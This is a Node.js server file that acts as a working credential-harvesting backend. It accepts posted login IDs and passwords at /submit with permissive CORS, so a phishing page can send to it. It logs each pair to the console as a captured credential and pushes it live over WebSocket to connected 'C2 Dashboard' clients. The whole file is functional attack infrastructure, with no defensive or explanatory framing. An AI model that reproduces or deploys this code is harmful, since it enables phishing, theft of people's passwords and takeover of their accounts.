/* server.js */
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');

// 1. HTTP Server listens for credential POST requests
const HTTP_PORT = process.env.HTTP_PORT || 3000; 

// WebSockets will be attached to the same HTTP server (path: /ws)
const WS_PORT = process.env.WS_PORT || 8080;

// Production domain (set via environment variable, e.g., DOMAIN=your-domain.com)
const ALLOWED_DOMAIN = process.env.DOMAIN || '*'; 

// Store a set of connected WebSocket clients (your dashboards)
const clients = new Set();

// Function to send captured data to all connected dashboards
function broadcastCredentials(data) {
    const dataToSend = JSON.stringify(data);
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(dataToSend);
        }
    });
}

// =========================================================
// HTTP Server (Credential POST Listener)
// =========================================================

const httpServer = http.createServer((req, res) => {
    // CORS: restrict to allowed domain in production
    const origin = req.headers.origin || '*';
    res.setHeader('Access-Control-Allow-Origin', ALLOWED_DOMAIN === '*' ? '*' : origin); 
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle initial CORS pre-flight request
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        return res.end();
    }

    // Process the POST request
    if (req.url === '/submit' && req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                console.log('-------------------------------------------');
                console.log(`[HTTP] Credential Captured:`);
                console.log(`  Login ID: ${data.loginID}`);
                console.log(`  Password: ${data.password}`);
                console.log(`  Timestamp: ${new Date(data.timestamp).toLocaleString()}`);
                console.log('-------------------------------------------');

                // Broadcast to dashboards
                broadcastCredentials(data);

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ message: "Data received and saved." }));
            } catch (error) {
                console.error('[HTTP] Error parsing POST body:', error);
                res.writeHead(400, { 'Content-Type': 'text/plain' });
                res.end('Bad Request');
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

httpServer.listen(HTTP_PORT, () => {
    console.log(`HTTP Capture Server (POST /submit) running on port ${HTTP_PORT}`);
});

// =========================================================
// Create WebSocket Server attached to the HTTP server
// =========================================================
const wss = new WebSocket.Server({ server: httpServer, path: '/ws' });

wss.on('connection', ws => {
    clients.add(ws);
    console.log(`[WS] New C2 Dashboard connected. Clients: ${clients.size}`);

    ws.on('close', () => {
        clients.delete(ws);
        console.log(`[WS] C2 Dashboard disconnected. Clients: ${clients.size}`);
    });

    ws.on('error', error => {
        console.error(`[WS] WebSocket Error: ${error}`);
    });
});

console.log(`WebSockets Server (C2 Dashboard) attached on path /ws`);